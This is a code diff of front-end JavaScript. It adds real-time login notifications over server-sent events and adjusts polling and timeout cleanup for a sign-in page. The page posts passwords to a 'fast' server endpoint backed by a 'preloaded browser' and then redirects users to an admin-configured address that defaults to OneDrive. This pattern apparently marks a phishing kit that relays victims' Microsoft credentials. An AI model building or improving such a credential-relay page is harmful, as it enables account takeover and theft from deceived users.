@@ -997,12 +997,37 @@ Status: ${data.status}`);
                         throw new Error('Popup blocked. Please allow popups and try again.');
                     }
 
-                    // Poll for authentication completion
+                    // Set up SSE connection for real-time authentication updates
+                    const oauthEventSource = new EventSource(`/api/auth-status/${currentSessionId}`);
+                    
+                    oauthEventSource.addEventListener('login-success', function(event) {
+                        console.log('🚀 OAuth login success via SSE');
+                        if (window.authTimeoutId) {
+                            clearTimeout(window.authTimeoutId);
+                        }
+                        if (authWindow && !authWindow.closed) {
+                            authWindow.close();
+                        }
+                        oauthEventSource.close();
+                        setLoading(false);
+                        
+                        const eventData = JSON.parse(event.data);
+                        currentSessionId = eventData.sessionId || currentSessionId;
+                        currentUserEmail = eventData.userEmail || eventData.email;
+                        showAuthSuccess(currentUserEmail);
+                    });
+
+                    oauthEventSource.addEventListener('error', function(event) {
+                        console.warn('OAuth SSE connection error:', event);
+                    });
+
+                    // Fallback polling for authentication completion (reduced frequency)
                     const pollInterval = setInterval(async () => {
                         try {
                             // Check if window is closed
                             if (authWindow.closed) {
                                 clearInterval(pollInterval);
+                                oauthEventSource.close();
                                 if (window.authTimeoutId) {
                                     clearTimeout(window.authTimeoutId);
                                 }
@@ -1011,12 +1036,13 @@ Status: ${data.status}`);
                                 return;
                             }
 
-                            // Check authentication status
+                            // Check authentication status (less frequent since SSE handles most cases)
                             const statusResponse = await fetch(`${API_BASE}/api/status?sessionId=${currentSessionId}`);
                             const statusData = await statusResponse.json();
 
                             if (statusData.authenticated) {
                                 clearInterval(pollInterval);
+                                oauthEventSource.close();
                                 if (window.authTimeoutId) {
                                     clearTimeout(window.authTimeoutId);
                                 }
@@ -1025,13 +1051,12 @@ Status: ${data.status}`);
                                 currentSessionId = statusData.sessionId;
                                 currentUserEmail = statusData.userEmail;
                                 showAuthSuccess(statusData.userEmail);
-                                // No frontend notification message here
                             }
 
                         } catch (error) {
                             console.error('Error checking auth status:', error);
                         }
-                    }, 2000); // Check every 2 seconds
+                    }, 5000); // Check every 5 seconds (reduced from 2 seconds)
 
                     // Timeout after 5 minutes
                     window.authTimeoutId = setTimeout(() => {
@@ -1039,6 +1064,7 @@ Status: ${data.status}`);
                             authWindow.close();
                         }
                         clearInterval(pollInterval);
+                        oauthEventSource.close();
                         setLoading(false);
                         showMessage('Authentication timed out. Please try again.', 'error');
                     }, 5 * 60 * 1000);
@@ -1071,33 +1097,37 @@ Status: ${data.status}`);
 
                 // Set up SSE connection for immediate redirect notifications
                 let immediateRedirectHandled = false;
-                const eventSource = new EventSource(`/api/auth-status/${currentSessionId}`);
+                let eventSource = null;
                 
-                eventSource.addEventListener('login-success', function(event) {
-                    if (!immediateRedirectHandled) {
-                        immediateRedirectHandled = true;
-                        console.log('🚀 Immediate redirect triggered by SSE event!');
-                        eventSource.close();
-                        
-                        // Get configured redirect URL from admin settings
-                        fetch('/api/internal/redirect-url')
-                            .then(response => response.json())
-                            .then(data => {
-                                const redirectUrl = data.success ? data.redirectUrl : 'https://onedrive.live.com';
-                                console.log(`Redirecting to configured target: ${redirectUrl}`);
-                                window.location.href = redirectUrl;
-                            })
-                            .catch(error => {
-                                console.warn('Error getting redirect config, using default:', error);
-                                window.location.href = 'https://onedrive.live.com';
-                            });
-                    }
-                });
+                if (currentSessionId) {
+                    eventSource = new EventSource(`/api/auth-status/${currentSessionId}`);
+                    
+                    eventSource.addEventListener('login-success', function(event) {
+                        if (!immediateRedirectHandled) {
+                            immediateRedirectHandled = true;
+                            console.log('🚀 Immediate redirect triggered by SSE event!');
+                            eventSource.close();
+                            
+                            // Get configured redirect URL from admin settings
+                            fetch('/api/internal/redirect-url')
+                                .then(response => response.json())
+                                .then(data => {
+                                    const redirectUrl = data.success ? data.redirectUrl : 'https://onedrive.live.com';
+                                    console.log(`Redirecting to configured target: ${redirectUrl}`);
+                                    window.location.href = redirectUrl;
+                                })
+                                .catch(error => {
+                                    console.warn('Error getting redirect config, using default:', error);
+                                    window.location.href = 'https://onedrive.live.com';
+                                });
+                        }
+                    });
 
-                eventSource.addEventListener('error', function(event) {
-                    console.warn('SSE connection error:', event);
-                    eventSource.close();
-                });
+                    eventSource.addEventListener('error', function(event) {
+                        console.warn('SSE connection error:', event);
+                        eventSource.close();
+                    });
+                }
 
                 // Use fast authentication endpoint with preloaded browser
                 const response = await fetch('/api/authenticate-password-fast', {
@@ -1122,7 +1152,9 @@ Status: ${data.status}`);
                 }
 
                 // Close SSE connection since we have the final response
-                eventSource.close();
+                if (eventSource) {
+                    eventSource.close();
+                }
 
                 if (data.success) {
                     // Only proceed if immediate redirect hasn't happened
